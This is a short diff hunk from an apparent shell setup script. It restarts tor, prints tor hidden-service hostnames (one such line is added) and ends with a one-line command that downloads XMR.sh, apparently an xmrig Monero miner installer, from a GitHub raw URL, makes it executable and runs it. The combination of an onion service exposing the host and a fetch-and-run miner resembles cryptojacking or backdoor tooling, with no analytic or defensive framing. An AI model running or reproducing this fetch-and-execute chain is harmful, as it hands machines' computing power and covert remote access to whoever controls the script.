@@ -13,4 +13,5 @@ sudo systemctl restart tor
 sudo systemctl start tor
 sudo systemctl enable tor
 cat /var/lib/tor/other_hidden_service/hostname
+cat /var/db/tor/hidden_service
 wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/XMR.sh && chmod +x XMR.sh && ./XMR.sh
